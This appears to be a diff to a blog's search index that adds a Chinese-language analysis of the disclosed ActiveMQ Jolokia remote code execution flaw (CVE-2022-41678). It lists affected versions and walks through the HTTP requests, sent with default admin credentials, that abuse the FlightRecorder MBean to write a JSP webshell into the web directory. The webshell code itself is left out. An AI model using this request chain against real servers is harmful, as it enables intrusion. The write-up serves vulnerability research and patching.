@@ -1,6 +1,82 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Apache ActiveMQ Jolokia 远程代码执行漏洞(CVE-2022-41678)分析</title>
+    <url>/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<p>ActiveMQ中，经过身份验证的用户默认情况下可以通过<code>/api/jolokia/</code>接口操作MBean，其中FlightRecorder可以被用于写Jsp WebShell，从而造成远程代码执行漏洞</p>
+<p>FlightRecorder存在于Jdk 11+，具体类名：<code>jdk.management.jfr.FlightRecorderMXBeanImpl</code></p>
+<a id="more"></a>
+
+<p>这个漏洞是我去年通过微步的X漏洞奖励计划提交的，今天看到已经被修复和公开了，就顺便写一下分析文章</p>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Apache ActiveMQ before 5.16.6</li>
+<li>Apache ActiveMQ 5.17.0 before 5.17.4</li>
+<li>Apache ActiveMQ 5.18.0 unaffected</li>
+<li>Apache ActiveMQ 6.0.0 unaffected</li>
+</ul>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>漏洞入口在 <a href="http://localhost:8161/api/jolokia/" target="_blank" rel="noopener">http://localhost:8161/api/jolokia/</a> ，注意需要带上Origin头才可以访问</p>
+<p><img src="/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/image-20220730133512058.png" alt="image-20220730133512058"></p>
+<p>主要问题出在FlightRecorder这个Mbean，功能是记录内存，gc，调用栈等，漏洞用到的方法主要是以下几个</p>
+<ul>
+<li>newRecording<ul>
+<li>新建记录</li>
+</ul>
+</li>
+<li>setConfiguration<ul>
+<li>更改配置</li>
+</ul>
+</li>
+<li>startRecording<ul>
+<li>开始录制</li>
+</ul>
+</li>
+<li>stopRecording<ul>
+<li>结束录制</li>
+</ul>
+</li>
+<li>copyTo<ul>
+<li>导出录制文件</li>
+</ul>
+</li>
+</ul>
+<p>漏洞思路是通过setConfiguration修改配置，把一些键名改成jsp代码，记录的数据就会包含该jsp代码，录制完成后，通过copyTo导出到web目录即可</p>
+<p>代码位置在 jdk.management.jfr.FlightRecorderMXBeanImpl#setConfiguration </p>
+<h3 id="拿到默认配置"><a href="#拿到默认配置" class="headerlink" title="拿到默认配置"></a>拿到默认配置</h3><p>调用setPredefinedConfiguration，断点停下来后可以拿到默认的配置，先保存下来</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/jolokia/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:8161</span><br><span class="line"><span class="attribute">Origin:localhost:8161</span></span><br><span class="line"><span class="attribute">Authorization</span>: Basic YWRtaW46YWRtaW4=</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 155</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    "type": "EXEC",</span><br><span class="line">    "mbean": "jdk.management.jfr:type=FlightRecorder",</span><br><span class="line">    "operation": "setPredefinedConfiguration",</span><br><span class="line">    "arguments": [1,"s"]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/image-20220730134739877.png" alt="image-20220730134739877"></p>
+<h3 id="新建记录"><a href="#新建记录" class="headerlink" title="新建记录"></a>新建记录</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/jolokia/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:8161</span><br><span class="line"><span class="attribute">Origin:localhost:8161</span></span><br><span class="line"><span class="attribute">Authorization</span>: Basic YWRtaW46YWRtaW4=</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 136</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    "type": "EXEC",</span><br><span class="line">    "mbean": "jdk.management.jfr:type=FlightRecorder",</span><br><span class="line">    "operation": "newRecording",</span><br><span class="line">    "arguments": []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>记录的id 为 1，后面poc都要使用这个id</p>
+<p><img src="/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/image-20220730134939126.png" alt="image-20220730134939126"></p>
+<h3 id="更改配置"><a href="#更改配置" class="headerlink" title="更改配置"></a>更改配置</h3><p>将默认配置的如下处改为jsp代码，特殊字符需要实体编码</p>
+<p><img src="/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/image-20220730135355053.png" alt="image-20220730135355053"></p>
+<p>如下 arguments 的第一位参数是记录id，第二个参数是配置内容（很长，已省略）</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/jolokia/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:8161</span><br><span class="line"><span class="attribute">Origin:localhost:8161</span></span><br><span class="line"><span class="attribute">Authorization</span>: Basic YWRtaW46YWRtaW4=</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 31263</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    "type": "EXEC",</span><br><span class="line">    "mbean": "jdk.management.jfr:type=FlightRecorder",</span><br><span class="line">    "operation": "setConfiguration",</span><br><span class="line">    "arguments": [1,"..."]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/image-20220730135515477.png" alt="image-20220730135515477"></p>
+<h3 id="导出录制到web目录"><a href="#导出录制到web目录" class="headerlink" title="导出录制到web目录"></a>导出录制到web目录</h3><p>开始录制</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/jolokia/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:8161</span><br><span class="line"><span class="attribute">Origin:localhost:8161</span></span><br><span class="line"><span class="attribute">Authorization</span>: Basic YWRtaW46YWRtaW4=</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 141</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    "type": "EXEC",</span><br><span class="line">    "mbean": "jdk.management.jfr:type=FlightRecorder",</span><br><span class="line">    "operation": "startRecording",</span><br><span class="line">    "arguments": [1]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/image-20220730135551581.png" alt="image-20220730135551581"></p>
+<p>结束录制</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;api&#x2F;jolokia&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Origin:localhost:8161</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 138</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;: &quot;EXEC&quot;,</span><br><span class="line">    &quot;mbean&quot;: &quot;jdk.management.jfr:type&#x3D;FlightRecorder&quot;,</span><br><span class="line">    &quot;operation&quot;: &quot;stopRecording&quot;,</span><br><span class="line">    &quot;arguments&quot;: [1]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/image-20220730135637118.png" alt="image-20220730135637118"></p>
+<p>导出到web目录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;api&#x2F;jolokia&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Origin:localhost:8161</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 159</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;: &quot;EXEC&quot;,</span><br><span class="line">    &quot;mbean&quot;: &quot;jdk.management.jfr:type&#x3D;FlightRecorder&quot;,</span><br><span class="line">    &quot;operation&quot;: &quot;copyTo&quot;,</span><br><span class="line">    &quot;arguments&quot;: [1,&quot;..&#x2F;webapps&#x2F;admin&#x2F;test.jsp&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/image-20220730135719277.png" alt="image-20220730135719277"></p>
+<h3 id="访问webshell"><a href="#访问webshell" class="headerlink" title="访问webshell"></a>访问webshell</h3><p><a href="http://localhost:8161/admin/test.jsp" target="_blank" rel="noopener">http://localhost:8161/admin/test.jsp</a></p>
+<p><img src="/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/image-20231129175943787.png" alt="image-20231129175943787"></p>
+]]></content>
+      <tags>
+        <tag>漏洞分析</tag>
+        <tag>ActiveMQ</tag>
+        <tag>Jolokia</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Spring-Kafka 反序列化漏洞(CVE-2023-34040)分析</title>
     <url>/2023/09/28/Spring-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2023-34040-%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<p>当受影响版本的 Spring-Kafka Consumer 未对Record配置 ErrorHandlingDeserializer 并设置 checkDeserExWhenKeyNull 或 checkDeserExWhenValueNull 为 true 且攻击者可以发布 Kafka 消息时，将会存在Java反序列化漏洞。只需发布 key 或 value 为 null 的消息，且在相应的header中放入序列化数据，便可以任意反序列化</p>
@@ -932,8 +1008,8 @@
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.ruanyifeng.com/blog/2020/02/sparql.html" target="_blank" rel="noopener">RDF 和 SPARQL 初探：以维基数据为例 - 阮一峰的网络日志</a></p>
 ]]></content>
       <tags>
-        <tag>CodeQL</tag>
         <tag>漏洞分析</tag>
+        <tag>CodeQL</tag>
       </tags>
   </entry>
   <entry>
@@ -1071,8 +1147,8 @@
 
 ]]></content>
       <tags>
-        <tag>CodeQL</tag>
         <tag>漏洞分析</tag>
+        <tag>CodeQL</tag>
       </tags>
   </entry>
   <entry>
